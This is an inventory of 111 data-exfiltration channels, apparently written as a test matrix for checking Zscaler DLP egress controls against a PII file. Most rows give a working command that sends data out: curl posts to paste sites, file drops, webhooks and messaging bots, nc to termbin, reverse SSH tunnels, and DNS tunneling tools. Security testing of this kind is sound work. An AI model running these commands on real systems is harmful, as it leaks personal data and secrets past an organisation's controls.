# Data Exfiltration Channel Inventory — 100 Methods (DLP Test Matrix)

Channels for verifying PII egress controls (TC-025 and related). MITRE ATT&CK: T1567 (Exfiltration Over Web Service) and sub-techniques, T1048 (Alternative Protocol), T1071.004 (DNS), T1572 (Protocol Tunneling), T1052 (Physical Medium).


## A. Push-notification services (T1567.003)

| # | Channel | Test method |
|---|---------|-------------|
| 1 | ntfy.sh | `curl -d "<data>" ntfy.sh/<topic>` |
| 2 | Pushover | `curl -d "token=..&user=..&message=<data>" https://api.pushover.net/1/messages.json` |
| 3 | Pushbullet | `curl -H "Access-Token: .." -d "body=<data>" https://api.pushbullet.com/v2/pushes` |
| 4 | Gotify | `curl -H "X-Gotify-Key: .." -d "<data>" https://gotify.example/message` |
| 5 | LiveKit/JetAdmin alerts | REST alert API with data in payload |

## B. Paste / text-storage sites (T1567.003)

| # | Channel | Test method |
|---|---------|-------------|
| 6 | GitHub Gist | `curl -u user:token -d '{"files":{"d.md":{"content":"<data>"}}}' https://api.github.com/gists` |
| 7 | Pastebin | `curl -d "api_dev_key=..&api_paste_code=<data>" https://pastebin.com/api/api_post.php` |
| 8 | dpaste.org | `curl -d "content=<data>" https://dpaste.org/api/2/` |
| 9 | dpaste.com | `curl -d "content=<data>&syntax=text" https://dpaste.com/api/v2/` |
| 10 | paste.ee | `curl -H "X-Auth-Key: .." -d "<data>" https://api.paste.ee/v1/pastes` |
| 11 | rentry.co | `curl -d "text=<data>" https://rentry.co/api/new` |
| 12 | termbin | `cat file | nc termbin.com 9999` |
| 13 | paste.rs | `curl -d "<data>" https://paste.rs` |
| 14 | cl1p.net | `curl -d "<data>" https://cl1p.net/<id>` |
| 15 | klipt.io | `curl -d "<data>" https://klipt.io/<id>` |
| 16 | justpaste.it | web UI / API |
| 17 | telegra.ph | `curl -d "title=..&content=<data>" https://api.telegra.ph/createPage` |
| 18 | controlc.com | web form POST |
| 19 | katb.in | `curl -d "<data>" https://katb.in/api` |
| 20 | paste.centos.org / snippet.host | `curl -d "<data>" https://snippet.host` |

## C. Anonymous file-drop services (T1567.003)

| # | Channel | Test method |
|---|---------|-------------|
| 21 | file.io | `curl -F "file=@numbers.md" https://file.io` |
| 22 | 0x0.st | `curl -F "file=@numbers.md" https://0x0.st` |
| 23 | transfer.sh | `curl --upload-file numbers.md https://transfer.sh/numbers.md` |
| 24 | tmpfiles.org | `curl -F "file=@numbers.md" https://tmpfiles.org/api/v1/upload` |
| 25 | uguu.se | `curl -F "files[]=@numbers.md" https://uguu.se/upload` |
| 26 | litterbox (72h) | `curl -F "reqtype=fileupload" -F "fileToUpload=@numbers.md" https://litterbox.catbox.moe/resources/internals/api.php` |
| 27 | catbox.moe | same API, permanent |
| 28 | bashupload.com | `curl -T numbers.md https://bashupload.com/numbers.md` |
| 29 | temp.sh | `curl -T numbers.md https://temp.sh/numbers.md` |
| 30 | gofile.io | `curl -F "file=@numbers.md" https://store1.gofile.io/uploadFile` |
| 31 | pixeldrain | `curl -T numbers.md https://pixeldrain.com/api/file/numbers.md` |
| 32 | filebin.net | `curl -T numbers.md https://filebin.net/<bin>/<file>` |

## D. Cloud storage (T1567.002)

| # | Channel | Test method |
|---|---------|-------------|
| 33 | Google Drive | API upload with OAuth token |
| 34 | Dropbox | `curl -H "Authorization: Bearer .." https://content.dropboxapi.com/2/files/upload` |
| 35 | OneDrive/SharePoint | Graph API upload |
| 36 | AWS S3 | presigned PUT URL |
| 37 | Azure Blob | SAS-token PUT |
| 38 | Google Cloud Storage | signed URL PUT |
| 39 | Mega | SDK/API upload |
| 40 | Box | API upload |
| 41 | Backblaze B2 | application-key upload |
| 42 | pCloud | API upload |

## E. Code repos & developer services (T1567.001)

| # | Channel | Test method |
|---|---------|-------------|
| 43 | GitHub repo push | data in committed file, `git push` |
| 44 | GitHub Issue comment | `curl -u user:token -d '{"body":"<data>"}' .../issues/1/comments` |
| 45 | GitHub PR description | data in PR body |
| 46 | GitLab snippet | snippets API |
| 47 | GitLab repo push | git push to gitlab remote |
| 48 | Bitbucket | snippet/repo push |
| 49 | Codeberg | repo push |
| 50 | npm publish | data inside package tarball |
| 51 | PyPI upload | data inside sdist/wheel |
| 52 | Docker Hub | data inside image layer, `docker push` |
| 53 | GitHub Actions artifact/cache | data in artifact zip |
| 54 | GitLab CI variable/log | data echoed in CI log |

## F. Messaging platforms & webhooks (T1567)

| # | Channel | Test method |
|---|---------|-------------|
| 55 | Telegram bot | `curl -d "chat_id=..&text=<data>" https://api.telegram.org/bot<token>/sendMessage` |
| 56 | Slack webhook | `curl -d '{"text":"<data>"}' https://hooks.slack.com/services/..` |
| 57 | Discord webhook | `curl -d '{"content":"<data>"}' https://discord.com/api/webhooks/..` |
| 58 | MS Teams webhook | incoming webhook POST |
| 59 | Matrix | client-server API room message |
| 60 | WhatsApp Cloud API | messages endpoint |
| 61 | IRC | PRIVMSG to own channel/bot |
| 62 | Keybase | KB chat API |
| 63 | Rocket.Chat webhook | incoming webhook POST |
| 64 | Mastodon | `curl -H "Authorization: Bearer .." -d "status=<data>" https://mastodon.social/api/v1/statuses` |
| 65 | Reddit | PM/post API |
| 66 | Twitter/X | tweet/DM API |

## G. Email channels (T1048.003)

| # | Channel | Test method |
|---|---------|-------------|
| 67 | Gmail API | messages.send with OAuth |
| 68 | SMTP direct | `sendmail`/`msmtp` to external address |
| 69 | SendGrid | `curl -H "Authorization: Bearer .." -d '{"personalizations":[..],"content":[{"value":"<data>"}]}' https://api.sendgrid.com/v3/mail/send` |
| 70 | Mailgun | messages API |
| 71 | Webmail compose | auto-filled compose URL / browser extension |

## H. Webhook test collectors (T1567)

| # | Channel | Test method |
|---|---------|-------------|
| 72 | webhook.site | `curl -d "<data>" https://webhook.site/<uuid>` |
| 73 | Pipedream/requestbin | HTTP trigger URL |
| 74 | Beeceptor | mock endpoint |
| 75 | postman-echo / httpbin | `curl -d "<data>" https://postman-echo.com/post` (echo only — tests reachability, not persistence) |
| 76 | ngrok inspector | POST to ngrok URL, inspect at :4040 |
| 77 | Own receiver via tunnel | `receiver.py` + tunnel URL |

## I. Tunnels & remote access (T1572 / T1219)

| # | Channel | Test method |
|---|---------|-------------|
| 78 | ngrok | `ngrok http 8000` |
| 79 | cloudflared quick tunnel | `cloudflared tunnel --url http://localhost:8000` |
| 80 | localhost.run | `ssh -R 80:localhost:8000 nokey@localhost.run` |
| 81 | pinggy | `ssh -p 443 -R 0:localhost:8000 a.pinggy.link` |
| 82 | serveo | `ssh -R 80:localhost:8000 serveo.net` |
| 83 | bore.pub | `bore local 8000 --to bore.pub` |
| 84 | frp | self-hosted frps + frpc |
| 85 | sish | self-hosted SSH gateway |
| 86 | tmate | shared terminal session (`tmate` — full shell, not just data) |
| 87 | Tailscale Funnel | `tailscale funnel 8000` |
| 88 | Telebit | tunnel service |
| 89 | SSH dynamic/SOCKS | `ssh -D 1080 user@vps` + proxy |
| 90 | Plain SSH/SFTP/SCP to VPS | `scp numbers.md user@vps:/tmp/` |

## J. Serverless / code-execution hosts (T1567)

| # | Channel | Test method |
|---|---------|-------------|
| 91 | AWS Lambda URL | function URL accepting POST |
| 92 | Cloudflare Workers | workers.dev fetch handler |
| 93 | Google Cloud Function | HTTP trigger |
| 94 | val.town | HTTP val endpoint |
| 95 | Replit/Render dev URL | web server on free dyno |

## K. Forms & note services (T1567)

| # | Channel | Test method |
|---|---------|-------------|
| 96 | Google Forms | POST to formResponse endpoint (data as answers) |
| 97 | Typeform/Formspree | hidden form fields |
| 98 | Notion API | append block with data |
| 99 | Google Docs API | insert text into shared doc |
| 100 | HackMD/CodiMD | create note via API |

## L. Encoded / creative channels (T1132, T1071.004, T1052)

| # | Channel | Test method |
|---|---------|-------------|
| 101 | Google Analytics collect | data in `ec/ea` params to `https://www.google-analytics.com/collect` |
| 102 | URL shortener slug | data embedded in path (tinyurl/is.gd API) |
| 103 | DNS TXT/DoH lookup | data in queried subdomain labels (requires controlled NS) — T1071.004 |
| 104 | DNS tunnel tools | iodine / dnscat2 — T1071.004 |
| 105 | Steganography + image host | steghide into jpg, upload to catbox/imgur |
| 106 | EXIF + photo upload | exiftool tag, upload to Drive/Photos |
| 107 | QR generator API | data encoded as QR image |
| 108 | Log aggregation SaaS | data inside error message to Sentry/Loggly DSN |
| 109 | Twilio SMS | data as SMS body via API |
| 110 | Blockchain OP_RETURN | data on public chain |
| 111 | USB / AirDrop / Bluetooth | physical — T1052.001 (endpoint control, not network DLP) |

## Own-receiver observation setup

- `receiver.py` — local HTTP receiver logging every POST to `received.log` (GET shows log in browser)
- `push_numbers.sh <url>` — sends numbers.md PII in batches (env: `BATCH_SIZE`, `WAIT_SECONDS`, `MAX_RETRIES`)
- `tc025_test.sh <url>` — full TC-025 suite: S1 batch/4s, S2 10s-sleep, S3 threshold 1/5/20 PII, S4 PAN JSON, S5 direct ntfy; writes `tc025_results.log`

## Findings so far

- Cloudflare tunnel edge (198.41.x) — TLS handshake reset on this network: filtering is network-level, not only on the Zscaler-agent device (#79)
- ngrok — endpoint agent on this Mac kills the process and deletes the binary: tunnel-tool blocking verified (#78)
- ntfy.sh / GitHub / localhost.run — allowed from this Mac (expected; verdict comes from the Zscaler device)

## Pass criteria (per TC-025)

Request blocked or connection reset per policy + incident logged in Zscaler Zero Trust portal (DLP logs). Any payload that reaches `received.log` = DLP gap.

## Prioritization note

For Zscaler validation, test in this order: (1) curl-able HTTP POST channels (A, B, C, H) — highest real-world abuse; (2) cloud storage & repos (D, E) — policy usually category-based, verify DLP inspects payloads not just URLs; (3) tunnels (I) — verify both network edge and endpoint agent coverage; (4) encoded/creative (L) — advanced, often gaps; report as findings.
